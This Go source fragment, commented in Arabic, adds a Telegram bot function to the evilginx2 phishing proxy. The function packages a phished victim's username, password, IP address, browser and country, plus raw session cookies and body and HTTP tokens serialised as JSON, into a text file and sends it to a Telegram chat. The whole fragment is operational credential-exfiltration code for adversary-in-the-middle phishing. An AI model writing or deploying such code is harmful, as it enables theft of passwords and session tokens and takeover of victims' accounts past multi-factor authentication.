
import (
	"github.com/kgretzky/evilginx2/database"
)

// تعريفات الهياكل والدوال الأخرى

// SendCookiesFile ترسل ملفًا يحتوي على الكوكيز والتوكنات الخاصة بجلسة ما
func (t *TelegramBot) SendCookiesFile(sessionID string, name string, username string, password string, remoteAddr string, userAgent string, country string, countryCode string, cookieTokens map[string]map[string]*database.CookieToken, bodyTokens map[string]string, httpTokens map[string]string) error {
	if !t.Enabled {
		return fmt.Errorf("بوت التليجرام غير مفعل")
	}
	
	log.Info("جاري تجهيز إرسال الكوكيز للجلسة: %s", sessionID)
	
	// تجهيز محتوى الملف
	cookiesText := fmt.Sprintf("=== معلومات الجلسة %s ===\n", sessionID)
	cookiesText += fmt.Sprintf("الفيشلت: %s\n", name)
	cookiesText += fmt.Sprintf("اسم المستخدم: %s\n", username)
	cookiesText += fmt.Sprintf("كلمة المرور: %s\n", password)
	cookiesText += fmt.Sprintf("عنوان IP: %s\n", remoteAddr)
	cookiesText += fmt.Sprintf("متصفح المستخدم: %s\n", userAgent)
	cookiesText += fmt.Sprintf("الدولة: %s (%s)\n\n", country, countryCode)
	
	// معالجة توكنات الكوكيز
	if cookieTokens == nil || len(cookieTokens) == 0 {
		cookiesText += "=== لم يتم العثور على كوكيز ===\n\n"
	} else {
		cookiesText += "=== توكنات الكوكيز الخام ===\n"
		cookieJSON, err := json.MarshalIndent(cookieTokens, "", "  ")
		if err != nil {
			log.Error("خطأ في تحويل الكوكيز إلى JSON: %v", err)
			cookiesText += "خطأ في استخراج الكوكيز\n\n"
		} else {
			cookiesText += string(cookieJSON) + "\n\n"
		}
		
		// إضافة عدد الكوكيز
		cookiesText += "=== إحصائيات الكوكيز ===\n"
		cookieCount := 0
		for _, cookies := range cookieTokens {
			cookieCount += len(cookies)
		}
		cookiesText += fmt.Sprintf("إجمالي الكوكيز: %d\n", cookieCount)
		cookiesText += fmt.Sprintf("إجمالي نطاقات الكوكيز: %d\n\n", len(cookieTokens))
	}
	
	// معالجة توكنات Body
	if len(bodyTokens) > 0 {
		cookiesText += "=== توكنات Body الخام ===\n"
		bodyJSON, err := json.MarshalIndent(bodyTokens, "", "  ")
		if err != nil {
			log.Error("خطأ في تحويل توكنات Body إلى JSON: %v", err)
		} else {
			cookiesText += string(bodyJSON) + "\n\n"
		}
		cookiesText += fmt.Sprintf("إجمالي توكنات Body: %d\n\n", len(bodyTokens))
	}
	
	// معالجة توكنات HTTP
	if len(httpTokens) > 0 {
		cookiesText += "=== توكنات HTTP الخام ===\n"
		httpJSON, err := json.MarshalIndent(httpTokens, "", "  ")
		if err != nil {
			log.Error("خطأ في تحويل توكنات HTTP إلى JSON: %v", err)
		} else {
			cookiesText += string(httpJSON) + "\n\n"
		}
		cookiesText += fmt.Sprintf("إجمالي توكنات HTTP: %d\n", len(httpTokens))
	}
	
	// إرسال الملف
	fileName := fmt.Sprintf("cookies_%s_%s.txt", name, sessionID)
	return t.SendFileFromText(fileName, cookiesText)
} 